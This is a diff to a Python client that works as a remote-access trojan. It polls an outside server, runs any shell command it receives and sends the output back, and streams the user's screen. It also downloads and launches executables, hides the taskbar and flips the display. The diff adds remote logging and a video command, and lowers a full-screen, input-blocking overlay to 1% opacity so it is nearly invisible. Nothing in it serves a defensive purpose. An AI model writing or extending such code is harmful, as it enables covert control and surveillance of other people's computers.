@@ -12,13 +12,13 @@ from time import sleep, time
 from threading import Thread
 from pyautogui import size
 from shutil import rmtree
-from pygame import mixer
 from io import BytesIO
 from mss import mss
 import tkinter as tk
 import pyttsx3
 import asyncio
 import aiohttp
+import pygame
 
 url = "https://ms32-c67b.onrender.com/"
 # url = "http://127.0.0.1:5000/"
@@ -32,7 +32,7 @@ bsig  = False
 user = "03"
 width, height = size()
 try:
-    mixer.init()
+    pygame.mixer.init()
 except:
     try:
         statement = f"WARN   no speaker detected, no audio will play"
@@ -54,9 +54,10 @@ def hit(url:str,data=None):
     # except:
     #     return "none"
 
-def log(statement,state="SUCESS"):
+def log(statement,state="SUCESS",terminal=False):
     try:
         statement = f"{state}   {statement}"
+        hit(url+"terminal",data={"output":statement}) if terminal else None
         hit(url+"output",data={"user":user,"err":statement})
     except:
         pass
@@ -66,7 +67,7 @@ def say(txt):
         engine = pyttsx3.init()
         engine.setProperty("rate",engine.getProperty('rate')-40)
         engine.say(txt)
-        log(f"Played {txt}")
+        log(f"Played {txt}",terminal=True)
         engine.runAndWait()
     except Exception as e:
         log(f"pyttsx3 thread error:\t{e}",state="WARN")
@@ -103,10 +104,10 @@ def playfunc(fp):
         #     pass
         CoUninitialize()
         log("Vol set to 80")
-        mixer.music.load(f"effects/{fp}")
-        log(f"Playing {fp}")
-        mixer.music.play()
-        while mixer.music.get_busy():
+        pygame.mixer.music.load(f"effects/{fp}")
+        log(f"Playing {fp}",terminal=True)
+        pygame.mixer.music.play()
+        while pygame.mixer.music.get_busy():
             continue               
         log(f"Done Played {fp}")
     except Exception as e:
@@ -165,7 +166,7 @@ def hide(state):
                             file.write(chunk)
                             downloaded_size += len(chunk)
             startfile("hide.exe")
-            log("Taskbar hidden")
+            log("Taskbar hidden",terminal=True)
         else:
             if not path.exists("show.exe"):
                 exe = hit(url+"static/updates/show.exe")
@@ -181,7 +182,7 @@ def hide(state):
                             file.write(chunk)
                             downloaded_size += len(chunk)
             startfile("show.exe")
-            log("Taskbar Unhidden")
+            log("Taskbar Unhidden",terminal=True)
     except Exception as e:
         log(f"hide/show thread error occured:\t{e}",state="WARN")
 
@@ -202,7 +203,7 @@ def restart():
                         file.write(chunk)
                         downloaded_size += len(chunk) 
         startfile("restart.exe")
-        log("Restarting...")
+        log("Restarting...",terminal=True)
         terminate = True
     
     except Exception as e:
@@ -263,14 +264,14 @@ def display(fp:str):
                         file.write(chunk)
                         downloaded_size += len(chunk)
         startfile("imshow.exe")
-        log("Started imshow.exe, llikely image showing")
+        log("Started imshow.exe, llikely image showing",terminal=True)
     except Exception as e:
         log(f"Display thread error occured:\t{e}",state="WARN")
 
 def flip():
     global sstate
     try:
-        log("Flipping")
+        log("Flipping",terminal=True)
         while sstate:
             screen.set_portrait()
             sleep(1)
@@ -299,8 +300,7 @@ def runcmd(cmd):
         if not stderr:stderr="none"
         if not stdout:stdout="none"
         output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
-        print(post(url+"terminal",json={"output":output}).status_code)
-        print("done")
+        post(url+"terminal",json={"output":output})
 
     except Exception as e:
         log(f"runcmd thread error:\t{e}",state="WARN")
@@ -322,6 +322,7 @@ def showerr(num):
                             downloaded_size += len(chunk)
         for _ in range(1,int(num)+1):
             Thread(target=startfile,args=("error.exe",))
+        log(f"deployed {num} errors",terminal=True)
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
 def block_touch(event):
@@ -332,8 +333,9 @@ def block_touch(event):
 
 def block():
     root = tk.Tk()
+
     root.attributes("-fullscreen", True)
-    root.attributes("-alpha", 0.2)
+    root.attributes("-alpha", 0.01)
     root.attributes("-topmost", True)
 
     root.bind("<ButtonPress>", block_touch)
@@ -364,7 +366,7 @@ def block_main():
         print("lock")        
 async def share(url):
     global sharing
-    log("Sharing screen now")
+    log("Sharing screen now",terminal=True)
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(keepalive_timeout=10)) as session:
         with mss() as sct:
             frame_count = 0
@@ -496,7 +498,7 @@ def main():
                 link = cmd.replace("oPeN ","")
                 link = link.replace("sPeAk","") if "sPeAk" in link else link
                 wbopen(link)
-                log(f"Opened {link}")
+                log(f"Opened {link}",terminal=True)
             elif "pLaY" in cmd:
                 fp = cmd.replace("pLaY ","")
                 fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
@@ -511,13 +513,17 @@ def main():
                 ifp = cmd.replace("iMaGe ","")
                 ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                 Thread(target=display,args=(ifp,)).start()
+            elif "vIdEo" in cmd:
+                ifp = cmd.replace("vIdEo ","")
+                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
+                Thread(target=display,args=(ifp,)).start()
             elif "fLiP on" in cmd:
                 sstate = True
                 Thread(target=flip).start()
             elif "fLiP off" in cmd:
                 sstate = False
                 screen.set_landscape()
-                log("flip off")
+                log("flip off",terminal=True)
             elif "cMd" in cmd:
                 cmd = cmd.replace("cMd ","")
                 cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
